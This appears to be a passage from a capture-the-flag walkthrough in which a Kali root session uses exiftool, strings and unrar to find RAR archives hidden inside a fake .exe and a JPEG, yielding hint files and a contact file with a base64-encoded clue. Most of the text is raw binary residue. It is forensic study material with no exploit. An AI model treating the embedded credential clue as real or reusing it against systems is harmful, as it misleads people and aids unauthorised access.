+S&}*}
+.hj|
+)%o3
+<L"<
+=@Yt
+/$V'~
+M4%zY=%
+ar,3
+!gR 
+=l=*
+"_EE$
+R6i&e
+&%MBE
+CIiI
+s)k0;)+)
+`vR{R;{
+5+i]
+fBkG
+56nF
+kh7c
+O\4q\O&Z
+nbCE
+rBoty
+}JecF
+JucV
+ySq6
+nRo7
+MVV7^
+39d+Q
+u^TD=
+rCT"i
+HyGE
+Z-0V
+mhM7
+vT]hl
+6Bwu
+!UHC
+{#*W
+mwT_
+O:6A
+.3%8
+C'8.
+.7nu
+#P<I"
+qS{O
+&_O{@j
+twOY
+N9`ka
+(K[2
+Qj[V9
+y4p+
+v9/B
+r^WV
+sI Opi
+dNwY
+nh.rm
+.	nn
+=!P*
+`0U<u
+^P_(F
+:5XN
+/EBVm
+d_Bd
+~_0r%
+zw S9
+WNv&
+9a /
+{+Tw
+wc(=
+{=x!Jn-
+<hn]
+X=3B
+24lY
+F,[<
+X.zV
+nxJ[m
+X_0lo;i9
+o[xe
+/iOp
+~zC?Wi
+aZ6Us]
+KYMrCr
+A2Ka
+kb/3
+-e_c+Y
+j24m
+ySwNw^
+"EJ)"
+3CSQ
+udaC
+P|B5
+P[h/
+8p*t6
+zB=M
+Kx8q
+pyxJ
+,QNr
+D2TL&
+uQ+r
++~H2B
+[~GR*
+'yD|@2F\
+KC)2
+z1]rI.a
+CR%U8
+RRZTK
+Y%Y%
+$, ,&,#4
+FpApqpY
+P~hx
+84:4&4>T
+y!7I0
+Budc
+yX{>
+D'I	l
+|)l~
+4B*$
+v^Iv
+mQ%='='f
+c#CG
+`ylR
+[tKX
+	+b+
+v>6XR
+":<]
+x{hd|
+K{16^
+:;~Z
++31N]
+kf]2s
+|?:F
+yuUb
+L|VO$
+sxtbJxLb
+.\C{
+cq/BxN
+{lf_
+ </6
+cQxKR
+pr$b8
+?Vr|
+hcz]
+9O&Ga]
+UD$'er
+X<O<
+ssSk
+I57$S;
+JG='<
+	o>z
+xc:S
+xJz^z^
+yxWZ
+baK2<L
+s;,&
+{dsl
+V1VHY
+]A\p
+RKRB5
+h|K3BW-
+SC=f
+U:=i
+xvzZ
+_={<
+,yUB\
+|=4+U
+x`S`+
+V`{`W
+Stf9
+/p!p9p
+hF<?8*X
+k(fu
+5J=i
+_G~|L
+5X#t
+V?n l
+y\Q}l[
+[|}o
+ce[]_
+5dgN
+>73[
+sdS3
+Ohl3
+WU]_
+Nj~e
+9J	e
+'GRk
+Z,wP
+	s	.
+YC	9z
+ZHXBh$
+#l$l!l
+cf..
+&lf[
+,[-I
+kSmq
+RdyL
+_<iQ-11
+`yM<m
+JQ|^
+WfPd-v
+%$FX
+>,A}
+chC:?
+5a\kC
+L.G}
+F0_{7Zv
+|7fc;
+[a'e
+aL]<?
+x.uj^L
+2Y&~
+B?gA
+	=oB
+1DQ3	5N-k
+F}1x
+wyC>
+LVj.
+Ss1WQ
+XA+V
+[&Ze
+x~4>
+Fr1l
+46r,
+-+96
+#w-EV
+iG,}
+'b}-
+[A[W
+h9.y"r
+VWKn
+iZsr_
+jEu\-
+%Q9eG4
+3A{"
+rfWgcs
+exKd
+rrW.
+cO-F
+D<38
+/+nY
+d:5P
+j8|1
+k*:-
+"13ks'
+yoVa
+q[@+
+H<M/
+p%x*
+>m2{
+I6v4H
+^p"i~
+[xnZ
+ug(1
+Vk{z
+i:.h.e
+Br^P{&
+YJ%Ae
+*'ko9S+
+<Nj86
+yK<'
+-Ht;
+$AK.
+$|3|%1
+h-%h+
+&x}4
+[m6X
+]f1ru c
+A%+T
+#7j#\=
+W*{GyM/
+=A|V
+ {J#7
+F>(Tu-
+~:93
+*+e%
+n {M
+$AK.
+$|3|%1
+"OFN
+_bg)
+,m-8
+#gwkd
+J}Pk	
+<KQD
+y:}#i}$h
+fh2ng
+2&yF!g
+{.Ae2
+h/OH
+ )`XCr
+u(v\
+$?E_
+&J/su
+~7%x
+`dHv
+e]Z:u
+L04%n
+d,O4O
+}.V|Nf
+xjMFY
+aT*z
+7H9I
+55P*L{
+~p?x
+6#<k
+'1zC4+
+Bk7$
+p^|g
+SC1kq
+fuS:
+yDhs
++o/k
+=Ya5
+V;5 GFp
+MMONt
+\5vN~
+Ei{Ic
+&m+8
+7B|s
+rAmV/
+u)<2
+W_;%
+W*V~
+V[w846,
++z9"
+m=bys
+.!jd
+}4nc
+by5M
+^|wi
+E|Wg
+-WqWS
+Jw]C
+uvu\
+j.z5
+v|tv
+u+yz
+T-rw
+U\BR
+m:}`
+v/r_
+|yeW
+A_L:Z
+-9yUA{
+7+SjG
+/C&C2C
+qBmuZ
+oeno
+QsR'
+:?_9)
+endstream
+endobj
+22 0 obj
+<</Type/XRef/Size 22/W[ 1 4 2] /Root 1 0 R/Info 10 0 R/ID[<785E9D493EFBA048B5A2BCCFC0272663><785E9D493EFBA048B5A2BCCFC0272663>] /Filter/FlateDecode/Length 87>>
+stream
+rL@}B
+endstream
+endobj
+xref
+0 23
+0000000011 65535 f
+0000000017 00000 n
+0000000125 00000 n
+0000000181 00000 n
+0000000476 00000 n
+0000000699 00000 n
+0000027576 00000 n
+0000027629 00000 n
+0000027796 00000 n
+0000028035 00000 n
+0000028088 00000 n
+0000000012 65535 f
+0000000013 65535 f
+0000000014 65535 f
+0000000015 65535 f
+0000000016 65535 f
+0000000017 65535 f
+0000000018 65535 f
+0000000019 65535 f
+0000000000 65535 f
+0000028741 00000 n
+0000028768 00000 n
+0000108177 00000 n
+trailer
+<</Size 23/Root 1 0 R/Info 10 0 R/ID[<785E9D493EFBA048B5A2BCCFC0272663><785E9D493EFBA048B5A2BCCFC0272663>] >>
+startxref
+108464
+%%EOF
+xref
+trailer
+<</Size 23/Root 1 0 R/Info 10 0 R/ID[<785E9D493EFBA048B5A2BCCFC0272663><785E9D493EFBA048B5A2BCCFC0272663>] /Prev 108464/XRefStm 108177>>
+startxref
+109082
+%%EOFRar!
+acid.txt
+You are at right track.
+Don't loose hope..
+Good Luck :-)
+Kind & Best Regards,
+Acid
+lol.jpg
+IQyYW
+3357<85
+'(''g
+x|~|
+j3Qb
+%5E]
+CKS[cn
+1Qr2\
+9IYir
+*:J^
+moqsuwy{
+V1cY
+,CPg
+#iFI%
+k	l^
+`0	]>'
+8UO7Z@M
+q4np
+#(%L
+j0@1
+un>t
+"@w2
+x50A
+qlUy
+QcxY
+E"pb
+{iI8
+!w7&~
+k  1
+RM-vHu
+$x%6T
+KF2J
+>A,i
+{E*bv
+9N,t
+yo|vQ:
+KOZ`
+?1te
+37JHmwN
+"mU>
+dMZP
+ x`vm
+A=}o
+HrDLY
+U4^[
+jJ6G
+ZGB'
+1G#N
+V=4N0
+H8'v
+My \n
+	C@?
+nY"yc
+3/K5
+(DVk{ 
+NYfp>>
+w$$J,w)
+Hq[t
+L6	7
+e%=m
+ZB&K
+^F(HB
+j7Zw=
+{HqX
+uh8,
+<|+X
+7>n"
+	AcJD
+F 98
+]ct@
+{1x4
+6AN!
+!+j%
+J&jM
+g5txi
+^w_*
+]D*3
+	zCw
+oS$nH<Z
+^rWK
+T])K[
+7@Q`,
++npsiKV
+HJqR
+uAC/
+v|G9e@
++n %H2
+Gq~F=\Y
+_9@RN
+s^pB
+[B1	~
+);vd
+F!^}
+~x@L
+Az{2
+(#pIkc
+rbWQWj
+m!$S
+ f`6
+?nwH`p1
+ ;@i
+HTQk
+]!\h
+"9Gc
+`.E4
+]Mm&^
+me2ZS!<
+?4-JT
+zcH<
+n].oGx
+XT1E
+WF=0
+s,Aq
+n)L|
+q;/;
+lN3-#
+<l-BH
+TN1D
+:-eI
+EBqcH
+k8T"
+u)-H
+-g"Y
+}^G#
+xy2X]l4^
+'t	0
+>_\V
+`:x/
+]yks
+W|0g2j
+TsOC
+wy	5
+N6}c/,
+"zNY8R@
+<X!R
+@.(a
+=ELe
+itQ_[
+	WP^*@D
+#hX]4
+bY5fh#
+yzot
+HzJ5
+B$H{
+dj@?
+A/T(*
+_2>eY\
+idVZ
+'k**5
+6fl9}K
+OGdm
+sX;R
+fb38
+voL{
+t4~?
+-}fC=a
+KlZT
+hdy<G
+*hko
+3fP\9
+T	ACOr
+GGTn
+"oy6
+fm(G
+lW~1
+/-aM
+t>>[
+etM12
+RgMM
+\/Azi$
+6msX]}
+!g3>
+\v2A
+%>(l(
+&4Bz
+P&4o
+9gqq
+Z.+t
+nelW
+ZN'0
+*,<hKq/<
+:4lV^
+N%l^
+(<8G
+M(I)*
+\U88
+&1jRv
+W8nLq
+/4t?Q
+0j]5
+]_EW
+NNR'
+W;Hus
+3X'<
+[COx
+p4Fo
+A=0nr
+'n!F.
+3se>
+n~Ud
+$8k{
+f*O:
+M	F6
+9&mN
+P$GW
+Isk{NC
+cW&z
+sv#~
+i=1JY
+r,vm/
+#rH`
+]G9wa
+09<~
+cnm5
++_W;
+O9z8+t	'+
+7T"h
+GM*60
+4	`A
+$+z:9
+Av(S
+nezD
+)t.L
+	gS24t
+f]|U
+zh6D
+_LtYn
+*@<b
+]<)	
+DZa>
+ryhs
+13vY
+*Of/s{
+)1.'
+eNzAG
+GhEqc4
+Cn,s
+)0Qx
+%E,o
+dr,[
+I6c[
+m-Z=
+_S	rY
+8E;4
+kY`~
+R3bJ
+FRY 
+yy{P
+`[M$
+hzm!
+J]x?p
+~Q?{
+C@jD
+nuxRF
+x7u5
+f[!H
+x{KU
+@pxD/
+qZ]f
++TUSN
+K|*f?
+\hS&
+(-kSk
+[p<P
+|6&V6
+AOz;
+*Coi+
+ qMlo
+HX7p
+:)fD]
+%"zc
+'<TMf
+l<jv
+bB,r
+To\J
+Jff~	0
+;=77
+?|2(A
+M5Gg
+k$,K
+/&L~
+\Pqk
+nKPN
+x_=9^
+PJn#
+KWH%B
+B}J$
+rdIt
+t0!h
+k4P2x
+OZYo
+M'.A
+g^8)
+)yI<
+F}cf
+;O*EK
+Kebv~
+d_;9
+QhLq
+%}$Z 
+< $T
+)aIK
+kP~Ml
+I/Zsl
+ snX>-J
+[<p)c
+VH<Ib
+2hcU
+;+J3i3J
+vE	3
+y9 dy
+ h^7s
+/ET=
+wTA#
+4;lQ
+ZIm=
+`(*UM
+6{'tnny
+.iYf
+oHgy
+U)-J
+3%}*	
+~)uQD
+;A}4>:
+#hsG
+cPUyC/"
+y2N8
+`hf:
+0-+1
+kd/Y
+lb-A
+}q-yx
+>C4#
+EH]\N
+0HWP
+-fabk
+'eV3
+8M_K
+Fev8%CA
+VO{'w
+s?u%P
+j Xl+
+Ep-j#me`#
+_3w#
+>|u4^
+'*e#
+wr$|
+;%D	
+os/n
+:ej%3m
+--"!^
+VHZ(
+z@vO83
+$"Wj
+NpG<
+fbQg
+/e,Ey
+J tz-
+}r#LR
+>g;SU<
+8a3?
+jc:{^O
+}jf:
+k6MM
+d.uA
+fs<G
+A}6|
+G+E(
+L#22G&$
+[Naj
+K;u:l
+)L6%
+m7vX
+ )1QT
+-T*U
+i53G
+-o6P 
+O;>%
+S`sC
+O_PgS%>}
+`&@1
+Bue13
+mJcg,(
+&VIy
+h\kr
+QS8p7I
+]:=*#<
+jyVt
+5'34
+p}v_
+w}0'
+"J7'4
+X%"H
+Jxkd
+'5c|
+R{jH'
+H{Zy
+4t;l
+xtF%
+og)0
+zx.}
+{W>|
+2q4+
+Yx|9B
+jV;?/
+C5aLm*
+5IPQ
+x,SO4M\
+j/ha
+S"mr/N^;_tH
+0_!F
+y!bBZ
+pG+#Ta
+hWZM
+(I\dQN4@
+A7]$
+uO&5
+|O?CK]
+c.=l
+z5{{
+p}Uw
+?<2@
+7K=l;
+	WE-
+/0XP
+:e`^I
+-xD_
+tkKW
+vW37
+lyA|
+/zOc
+}/AM
+(VVk
+t7;a
+];_u
+v=nr
+M<X!h
+@CA}
+*D8De
+]$N8
+z;Gr-V
+[s"4
+={G1=
+*ziVP
+knXeGdDq
+-^Re
+]p9u
+*R<}k
+|ijKe
+iW$JIr}v
+}'7|z
+W#dZ=v,mZU
+JcR;
+	T8i
+Rxrk
+z(u8	W#
+Wbq-
+Yjjr
+T#}j
+cG8Hb
+- K/
+"&uou
+aV(rXT]
+~eUz
+%Q%|Jl"
+&9AEtR
+>h|A
+&ber
+r)Y@
+OMFA	
+1S&[
+\VK,
+9Vm	
+Cjyt
+TQ|Ro
+4FrjK
+7o/q
+,Ynx
+!nYJ
+|>W_
+=[Q2
+kn	t_}
+U1U3:
+kiX(rJ
+romS
+k2_I
+X%+b
+Dsw?GSX
+8{uYy[
+27~@1
+Z>47
+S[aH
+f[kC
+&6v?
+][L-
+)zA^
+96wk
+bJ0s.
+:63T
+Ufms.
+`*9U,
+B$^X
+N_,r{
+m/=Q
+TZ*v
++>{ry?
+!Y0/
+_MNz
+BFy]
+Egkb
+x"AT
+Xw6 
+{/ev
+e"z@
+Hsn[
+}36MK
+RYB<
+yCoC
+m{LN]
+l-&lj
+_WytL
+ eUf
+E!)\8vX
+/cD[K
+|?G)
+Bk}N
+:Sc^=I
+{ed2
+()L^
+Zc?s
+pu*.
+L5'YOz]
+PQ0~
+J:T	
+k7Qc}
+:~Hlp
+3G.B
+"Y5U
+P<Js]
+-Zbx
+!9q4
+NQ4]
+$]">
+a;RJF
+n'a8
+N@-9
+?|+u,
+wXxV
+j^Cfc
+Dd/m
+=Ot6
+8S<~
+ohHf
+_Yk4
+K3?b
+yQS^
+y y{
+uw8kA'
+{eUr
+L"nf
+p[pDGs
+s[dm
+M"9I
+'Z~;A
+-$#s
+,5?\u/
+SZ;~
+A@WvO
+#Ul;o
+gIv{"
+D,9M
+/<.b
+o[[D
+cj>@
+- JD
+m5SZ
+{T(;u
+]B3%l
+1-4-
+u=>h
+)2/hG
+9]09
+yAhz
+KKe!
+Nu}x
+cGPI
+J<fq
+<0OF7
+h)`g
+]u/ri
+LzYj
+H(-<
+R/c8
+)`lB
+ S[W 
+k&'u
+<Uiq4o
+EV)P
+.QjH
+d&\(
+n"u8
+:)aQ
+Cd=_B
+*&ap
+sao=
+w'o!
+S{|j"
+uKTJ]
+N`A%
+m.'O
+q4+Z
+`x$6x&
+TF%c}
+Vq[Sd
+$/	8WJ
+zqV\
+F9i+
+-	z!
+w_mt$
+%}^^
+wOIHq
+YbVSL
+]AOCe
+"[#2
+4T5m
+~d4*
+D?#yWD
+ld*hh
+m/\	
+s:ng
+VPz`V|
+>f7Oi
+juK{
+*a26
+UkFf
+ch:3
+W")>
+LYGuh2
+N"g-
+|_Pn
+~[%7
+,C]UL=F
+Op -
+y"W/v
+K`TX{
+cVDz
+Cd)a(
+g~TE8
+;|-J
+'`/z
+qhiF
+z	({
+Ie	_
+k(%NXO
+6ey0
+l.KW
+<e:8
+3)[z
+_i\!
+F{Nw
+IV}>
+ardQP
+56Ja`
+V2~A)
+5fXS	
+glwC
+A"0^
+gDV>
+i\*`
+L.Sw9
+BZ2*^
+T-rTs
+rA`*
+PNf6
+8cE`f
+^h|o
+G*^4!8P
+jg4z
+Y[[|
+)g<3
+):A_
+K(7}3Q
+2W%!
+S|DJ:
+ffi|
+ozu'
+^	m^T?!e/
+)iAS
+S;)`
+F9-S
+kON\
+2;wo
+.4e3
+I\Hg
+jadOiZ
+j#Kqg0,
+/.H6fY
+6C[WzR
+8mZZ
+E	%9
+o D-G
+Ren<
+(\q,
+u$6q
+kOsP
+J{|=
+dA:l
+LT)fZ
+y5[g~
+ 761e
+34{NT
+!zY7
+nvzO\4
+r[2y
+L!Hg
+g6*:D
+c>0p+b
+~ [`
+E9_:
+8@05Ii;
+fOQ}
+L;~m)8
+T6Xo
+4Oa8J
+8d^QC
+yX[o
+QAdz
+,o[.:
+?T,5
+UcGSF
+&]E;9
+$8>v
+@4H&_
+ezi]h
+[S)@I
+>#?@]
+ SDW
+S-CPtf[z
+i9Ne
+p./\
+,}c.
+_9S21
+bx^M
+C4:H
+7gN1v
+root@kali:~/Desktop# 
+root@kali:~/Desktop# exiftool strcpy.exe 
+ExifTool Version Number         : 8.60
+File Name                       : strcpy.exe
+Directory                       : .
+File Size                       : 164 kB
+File Modification Date/Time     : 2015:11:19 23:34:43-05:00
+File Permissions                : rw-r--r--
+File Type                       : PDF
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Warning                         : Invalid xref table
+root@kali:~/Desktop# 
+
+root@kali:~/Desktop# cp strcpy.exe strcpy.rar
+root@kali:~/Desktop# unrar l strcpy.rar 
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+SFX Archive strcpy.rar
+
+ Name             Size   Packed Ratio  Date   Time     Attr      CRC   Meth Ver
+-------------------------------------------------------------------------------
+ acid.txt           92       92 100% 23-08-15 18:16  .....A.   C36F494E m0b 2.9
+ lol.jpg         60961    58715  96% 23-08-15 18:09  .....A.   1E328F91 m3b 2.9
+-------------------------------------------------------------------------------
+    2            61053    58807  96%
+
+root@kali:~/Desktop# 
+
+Extract strcpy.rar
+root@kali:~/Desktop/strcpy# ls
+acid.txt  lol.jpg
+root@kali:~/Desktop/strcpy# cat acid.txt 
+You are at right track.
+
+Don't loose hope..
+
+Good Luck :-)
+
+Kind & Best Regards,
+Acid
+root@kali:~/Desktop/strcpy# 
+
+7.) Examine lol.jpg
+root@kali:~/Desktop/strcpy# exiftool lol.jpg 
+ExifTool Version Number         : 8.60
+File Name                       : lol.jpg
+Directory                       : .
+File Size                       : 60 kB
+File Modification Date/Time     : 2015:08:23 18:09:11-04:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+Image Width                     : 900
+Image Height                    : 636
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 900x636
+root@kali:~/Desktop/strcpy# strings lol.jpg 
+JFIF
+$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+	#3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+(z,!w
+R@Ug
+>iXE
+c,[J
+$)4X
+g\8,NiX
+X.!zv
+v)0Y
+Vf=H
+Y6#V
+{v?&A
+a7Q`
+84Xh
+h?3P
+k5Z@0
+i|U$
+_2o!O
+Y8oZv
+@\i~qN
+,1CQ`
+\3@\Q@
+p4XB
+W%nI'
+c15V
+[i~\zP8
+c5Z@7&
+poSR
+4Q'$
+MR@4
+c=R@FZ
+BP1@9
+TS)h;{z
+`86j
+`sAD
+2an~z
+MR@4
+3M!	
+PKc7d
+R3b+
+Ej,]
+Y#13L
+MC`XH
+@\7R
+@\7S
+nh.,
+Ab0~j
+!3@	
+9Ygf
+J`!4
+LFMM
+X`Vr@u
+lSCD
+w4SDw
+@(5,b
+MZ.,
+,r:P
+qA7E+
+CHA@
+M3^b9
+C@	@
+`&{S
+3@X2(
+#zc!bsT!
+i\bQp
+a3@X3@
+vMbt
+g3?4X
+Rw+f
+.7w4
+p1JRQWeE]
+3@X(
+5HBf
+7&F-
+=V;Kh
+p.[[
+qLLRh
+=+9B
+$jn\e
+k,]F
+?.J.E,
+|} )#)
+rVcsLA@
+h@jF- 
+nu_S
+3_px
+q]IiM
+J.R.
+_hWV
+Q^6>$
+L%EV
+a3@X3@X3@
+!3L@M
+3_`xa
+)JJ*
+1w}h
+#Qoe
+C	M.
+E8\n
+O03@
+rEc&K6
+<T6"@)
+!#2b
+U\Vbf
+0)k#
+zxL-
+b1IY
+	>jg
+Ltm0
+|1>wi
+xg",
+@:4y$
+b1QVE
+a1HV
+:V2d2
+fa8l
+Z@.h
+c`8#
+\8TQ
+.3vg
+vgjw
+W2[D
+;nrX
+&zx\'
+QqXT
+YJfl
+b,FjX
+w9&Uv
+Q'gt
+cbl"e
+SAr	
+0n{G
+;{;t
+RU%y3
+U\G3
+E>rn.E
+!$T{T
+<Wb:H
+qX\T
+$2pGj\
+3=S_
+*noC
+77vz
+)\,?
+oJ.;	
+b=qK
+W`8D
+m,%p
+ce{{T
+Y~*1
+OiMI
+c]4Z
+g77vz
+$OP0
+kjTgV\
+msy3H
+TJ@lK
+P1n!(
+y3(3>+
+#Z	c
+IC+z
+|	sw
+u]SXF
+izdVv
+cP85
+]Ob	EY
+L'9I
+77rk
+*.wJ
+(t*z
+,rOs^
+ha,E l
+2d9bi&b
+Rd2rM+
+`E-X
+uqG+
+I>e%Gz
+# U$
+lnI*Qs
+U\uQ_;)
+P7`k
+gyVN
+]4iB
+*otz
+Fx|j>
+}N,e>h
+csR 
+~]%gc
+.X"'QA]
+*S (
+6IKt
+	Nsz
+D5#:[k
+][\.
+OSQ]^
+<#V1
+!OJ@xW
+/c6o
+5Fyy
+go^1DsM
+i\v9
+mIuO
+)sE3v
+u5c$
+SrI@
+8yNk
+'!\d
+ASrIbM
+bqC`<
+`#`3
+)4\E
+<Wb]Cb
+0>Q\
+W%[+q
+^Y80
+nu}At
+t}{J
+quk|L
+JHJm
+{M`jqFvI
+N)AY
+sGO%
+q]6;9
+bGF#
+rp(@FS
+0)6"
+McV|
+0obR3d
+=1ZIs+
+6g\kR
+TI+`e
+ZB9_
+,-e.
+.4mZk+
+\t#5
+3>+E
+2})!
+(L.C4[
+gr,K(
++ rKc
+PYEp
+fNW6"
+8zQ5T
+'mPX
+!}j\
+7s>y=
+,DHn
+oR[.A
+f/REEU
+4D`v
+Qh(+
+ I4\C$
+C!Vf
+aIhl
+bsJU
+5	Q63
+.`5t=N
+YYH<
+B=Ne	K
+^2Ui
+E(*2h@B
+-P,y"
+;,NQ=
+Sq\U
+KkI_>
+.t'4]
+`s_U
+#}gww
+2qw@x
+	T<L
+i\`A
+$7Q@
+dn7) T
+%=$g(
+qC`Lb
+yY=8
+Np:S
+!,rx
+hNODzO
+$gQ6
+9jk7dY
+XxgOX
+62|C
+Oy: 
+<,]eRZ
+."D^i
+qZ@9W
+Qp!c
+ri12
+B`Jx
+ni\H
+5bw%
+ZGVJ
+N;#U
+CH;0
+!ETFv
+knwahs
+h2CdaAp
+	5#9
+Etak
+<O*^\
+{9vSS
+,$y`
+cW^h
+}J;kx
+f[v>
+#VQV@h
+-Z`Vt
+]XZj
+b78j
+	|ks
+'Bn2G
+0Oj."XO
+lh|y2
+FFMCd
+qvv5
+fl6q
+	,2}
+c^nLM
+qW'd=
+(.utEH]hm
+7duj0
+Vi<4
+*Spvdq
+qLdb6c
+H	QG
+Gn7/
+X9TW)E
+ >RJ
+W1&/
+h`jF
+Vd20
+.i6"(
+@:\l
+w)NHS$
+pr3_
+s:Ki
+8d5wE
+|M>x
+ci-f
+lS<Z
+$9#h
+j#Qs
+3?=)&Q
+1!r_
+Jb4 
+M\W4
+T*#+
+wvr2M
+N2I#
+kF	4g
+HW(1Y
+,jV"
+(Gzq
+Oiy1T=
+<k,M
+-|ndE<
+N|BN
+6{P!
+26A#
+9lp(lH
+OSBb
+7*? 
+Rkmn
+Nf;_
+ME9r
++]K)
+l4ZU
+<VNPN
+`V.M
+J+JL
+ycp'
+$j7L2"
+[yZ7
+Wuoz
+Wd*F
+ T6I
+aXIN
+2.>i
+;wnFs
+jV4 
+k%`%v-
+`2HK
++[hl
+DK-g
+i8[TQ
+pVCH
+4Ml2
+&4C9 
+.gMU
+R&e-
+dsHM
+`)\l
+hSd{
+^B{WD
+n<S-
+<bzI
+a5mW8
+j8Qv-=
+GCVPP
+OJr@2p
+8dkMZ
+WD$[W
+R=,y
+r-l(f
++HNv
+EXXbr
+jdK)
+h:g%c
+F_&>
+yq2G
+OpDAF
++_f_)c
+0[lg
+>6sKr
+<7r,
+	bb3
+*R8kds
+m_A@
+`pE|
+Fir!{4^
+TD70
+Ewr$
+^F,0)
+"nhIlK
+X_CtG*pA
+f$KlB
+h@r9n
+5yXH
+I]$7v
+W3w$
+`.|3
+unYY
+hKfi
+-nkrx
+r*l&
+nu9N
+i8r+
+7P=(
+Tubd	
+d!Em
+jSoA
+RQDZ
+[!Eu
+CVhw
+@enz
+X`S@f
+Ur_R
+U!E+6+
+OBv\
+YU^MW5
+E}.b
+>+mA#o
+k,ME
+)nel*
+c$F;
+U#fv
+5M{]
+`D+7ZO
+uc-$
+\kJ;2
+$4aR
+N]M)
+fqb1M
+=RnOSS
+(?trk
+.`A1
+VkV2)
+bR{T
+qaTL
+CW,}
+Rrwg	j
+]X8^\
+kuV3
+-Eti
+I>mM
+jKd;
+m}}v
++Jz 
+)7p"
+qn`J
+t9Xv$
+*C$e
+4%q6^c
+Z&"hcQ
+70rDK
+?uMR
+gF-{
+$JK0
+mg)\
+'d&rs>Y
+*]t=
+:"Yb
+}95\
+i6RD
+=*.$]
+g;y3
+E$R#
+cLm+
+(>g 
+dF6w>
+,oFn54YQ
+nEfQ
+\,!J.
+'4\	Q@
+g7v&ck
+jGfz
+Gk	.d
+94\	g
+U'edC
+:1t*9$
+MIC0
+:SlV&
+8#$V`
+2NkP
+d}aom
+-,Gi>
+KjUK(
+Jr=@
+iE\DEs
+o@"c
+VrrTri
+~\fV
+$~Lk
+W)h1/
+EJ@J
+ %Oq
+Rb&1)
+zQq\a
+`)E	7
+d=M6
+`L(Q
+jr}i
+2d`s
+Csnn
+*%b:
+&4}o
+77c`
+rklD
+#fh*W8
+U)\	U)
+	U=i
+)\	R
+{P&N
+29Iy
+Or;l(b
+HEk0
+q}Cr)
+RHv#
+Cel	o
+P$:0=8
+bo/=3C
+?-O&
+9X4y
+TZ@L
+Qq4;f;
+`zP;
+@X0=(
+l	]0
+v0Xv[
+C(\HZB
+P4Y(
+wbT8aWR<
+jO`g	
+E5vq0
+2R`L
+cJP!
+R Xq
+9UW,h
+Km'&
+Kabx
+QaX<
+HB@X
+ .3\
+zSB"(
+K7aBB*L
+$GBBe
+1)gs
+ 35mwN
+oO&I
++;U_
+-0#q
+b	rrMg$&Y
+ak	nI"(P
+P"7"I
+LHnDm
+#9bM0+
+=(dH
+!3f"Y
+hL'#
+R6e6
+KWv=8
+j;$b
+rop!
+SY<-E
+I9=	
+gQmk
+g1Dp
+M{:|
+PL}jZ
+)L0J
+4\v-]|
+.=+$&C
+nETcq
+TF1m
+bifD
+b'QH
+6i95
+@UyNj
+X2Yr
+yRzf
+! p)
+v8`zP
+Q3cL
+k@a}
+6hbb
+NqB`-
+/ZHB
+Mvb"
+9?J`
+ak a
+={Sh
+1f?J
+M EX
+3n=j
+i$&$l
+knTY
+BD2.Z
+H	D|
+R*Kp(
+Kc%<
+VE$		n
+Kc'`
+u0Gm
+j@i$
+mnOj
+OZLLIH%Tt
+8U^(B%
+ UGa
+'^N+tP
+JkZz!
+ZK`[
+C	rI
+ZYrp*
+1qKA
+@=W R
+.@i[Z
+Vn@i
+B{^zV
+)!t)
+OJh	
+U$&B
+OJ@=
+L	#^)\	Up3I
+1@	@
+!Z.!
+b+&{
+]<b<TIjS 
+Ul&N
+zQpD
+d2B8!x
+Q`#e
+x>@k
+`".[o
+D1)g
+7`e9
+'KNzQp-
+Vn`^
+(#$T
+ `?!>
+J@BG&
+G;$#
+*rTU
+n[sb
+$[Oj9
+PTqX
+$aW{
+jo`b;
+w!Oj
+7}	EY
+X{QP$
+~g9&
+]H^B
+HhtB
+BEUbf
+-Yd'=
+PEft*X
+,`9<
+2NxQ@
+Ji#KXf
+c)JK[
++Y[Rm
+O(zQp
+8D=(
+hhJc
+R98f
+FqN%
+Lb1=
+~}+K
+Rras
+`9x5-
+4 #'5C
+Jle_3k
+b{~c
+/CWOR
+JI>C
+LCs?
+q@	@
+'=:Vr
+G&?,
+2wX"L0
++[)I
+Ry>S
+)\L]
+ 1-+
+Q67b
+Rs'zv
+:h3n)`u
+1Z_z
+)]h3;R
+Wp+4
+E %QHc
+Gj`-
+=+2J,HVn
+5v,qcU`#s
+26cT!
+Rar!
+"ot 
+Avinash.contact
+r9lD
+,~E|i
+TMcX
+\	'|!
+k\w;
+{{5WH
+aG]p
+Q%,i]
+UR]7
+@7W!
+Rv<{p]]D
+gswW
+@ugt 
+hint.txt
+`You have found a contact. Now, go and grab the details :-)
+root@kali:~/Desktop/strcpy# 
+root@kali:~/Desktop/strcpy# cp lol.jpg lol.rar
+root@kali:~/Desktop/strcpy# unrar l lol.rar 
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+SFX Archive lol.rar
+
+ Name             Size   Packed Ratio  Date   Time     Attr      CRC   Meth Ver
+-------------------------------------------------------------------------------
+ Avinash.contact     1662      755  45% 23-08-15 17:10  .....A.   377B8CBF m3b 2.9
+ hint.txt           62       62 100% 23-08-15 17:11  .....A.   1B38E718 m0b 2.9
+-------------------------------------------------------------------------------
+    2             1724      817  47%
+
+root@kali:~/Desktop/strcpy# 
+Extract lol.rar
+root@kali:~/Desktop/strcpy# cd lol/
+root@kali:~/Desktop/strcpy/lol# ls
+Avinash.contact  hint.txt
+root@kali:~/Desktop/strcpy/lol# cat Avinash.contact 
+<?xml version="1.0" encoding="UTF-8"?>
+<c:contact c:Version="1" xmlns:c="http://schemas.microsoft.com/Contact" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P" xmlns:MSWABMAPI="http://schemas.microsoft.com/Contact/Extended/MSWABMAPI">
+	<c:CreationDate>2015-08-23T11:39:18Z</c:CreationDate><c:Extended><MSWABMAPI:PropTag0x3A58101F c:ContentType="binary/x-ms-wab-mapi" c:type="binary">AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</MSWABMAPI:PropTag0x3A58101F></c:Extended>
